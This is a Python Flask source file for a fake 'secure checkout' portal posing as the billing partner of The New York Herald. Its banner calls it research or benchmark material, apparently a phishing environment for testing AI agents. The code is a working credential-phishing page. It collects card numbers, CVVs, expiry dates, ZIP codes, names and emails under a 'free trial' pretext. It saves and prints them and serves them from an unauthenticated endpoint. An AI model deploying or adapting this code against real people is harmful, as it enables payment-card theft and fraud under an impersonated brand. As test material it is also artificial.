"""
Billing Portal — Secure Checkout for The New York Herald
Port: 8041 (configured in config.json)
Domain: secure-checkout.nyherald.com

Separate billing domain that collects credit card information
under the guise of a "free trial" for the news subscription.
Designed to look like a legitimate PCI-compliant billing partner.
"""

import json
import os
from datetime import datetime
from flask import Flask, render_template, jsonify, request, redirect
from flask_cors import CORS

config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config.json')
with open(config_path, 'r') as f:
    config = json.load(f)

app = Flask(__name__)
CORS(app)

PORT = config['ports']['billing_portal']
NEWS_PORT = config['ports']['news_site']
NEWS_DOMAIN = config['domains']['news_site']

captured_data = []


def _captured_path():
    return os.path.join(os.path.dirname(__file__), 'captured_data.json')


def save_captured():
    with open(_captured_path(), 'w') as f:
        json.dump(captured_data, f, indent=2)


def classify_pii(data):
    sensitive = ['card_number', 'cvv', 'expiry_month', 'expiry_year', 'billing_zip']
    return [f for f in sensitive if data.get(f)]


@app.route('/')
def index():
    return redirect_to_checkout()


@app.route('/checkout')
def checkout():
    email = request.args.get('email', '')
    name = request.args.get('name', '')
    return render_template(
        'checkout.html',
        config=config,
        email=email,
        name=name,
        news_domain=NEWS_DOMAIN,
        news_port=NEWS_PORT
    )


def redirect_to_checkout():
    return redirect('/checkout')


@app.route('/api/submit-payment', methods=['POST'])
def submit_payment():
    data = request.json or {}
    timestamp = datetime.now().isoformat()

    pii_fields = classify_pii(data)

    entry = {
        'timestamp': timestamp,
        'type': 'payment_submission',
        'data': {
            'card_number': data.get('card_number', ''),
            'expiry_month': data.get('expiry_month', ''),
            'expiry_year': data.get('expiry_year', ''),
            'cvv': data.get('cvv', ''),
            'billing_zip': data.get('billing_zip', ''),
            'save_payment': data.get('save_payment', False),
            'email': data.get('email', ''),
            'name': data.get('name', '')
        },
        'pii_fields': pii_fields,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    captured_data.append(entry)
    save_captured()

    print(f"\n{'!' * 60}")
    print("BILLING PORTAL - PAYMENT INFO CAPTURED")
    print(f"{'!' * 60}")
    print(f"  Name: {data.get('name', 'N/A')}")
    print(f"  Email: {data.get('email', 'N/A')}")
    print(f"  Card: {data.get('card_number', 'N/A')}")
    print(f"  Expiry: {data.get('expiry_month', '')}/{data.get('expiry_year', '')}")
    print(f"  CVV: {data.get('cvv', 'N/A')}")
    print(f"  Billing ZIP: {data.get('billing_zip', 'N/A')}")
    print(f"  Save Payment: {data.get('save_payment', False)}")
    print(f"{'!' * 60}\n")

    redirect_url = f"http://{NEWS_DOMAIN}:{NEWS_PORT}/article/ai-regulation-eu-framework?subscribed=1"

    return jsonify({
        'success': True,
        'message': 'Trial activated successfully',
        'redirect': redirect_url
    })


@app.route('/api/captured')
def get_captured():
    return jsonify({
        'total_submissions': len(captured_data),
        'submissions': captured_data
    })


@app.route('/api/clear')
def clear_captured():
    global captured_data
    captured_data = []
    if os.path.exists(_captured_path()):
        os.remove(_captured_path())
    return jsonify({'success': True, 'message': 'All captured data cleared'})


@app.route('/api/health')
def health():
    return jsonify({
        'status': 'healthy',
        'site': 'billing_portal',
        'port': PORT,
        'captured_count': len(captured_data)
    })


if __name__ == '__main__':
    print(f"\n{'!' * 60}")
    print("Billing Portal — Secure Checkout (Research/Benchmark)")
    print(f"Running on http://localhost:{PORT}")
    print(f"Domain mapping: {config['domains']['billing_portal']}")
    print(f"{'!' * 60}\n")

    app.run(host='0.0.0.0', port=PORT, debug=True)
